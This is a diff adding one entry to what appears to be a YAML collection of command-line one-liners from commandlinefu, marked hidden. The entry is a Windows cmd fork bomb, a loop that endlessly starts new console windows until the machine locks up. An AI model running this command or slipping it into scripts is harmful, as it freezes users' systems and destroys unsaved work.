@@ -1,0 +1,8 @@
+commandlinefu_id: 11314
+translator:
+  weibo: ''
+hide: true
+command: |-
+  for /l %a in (0,0,0) do start
+summary: |-
+  Fork Bomb for Windows
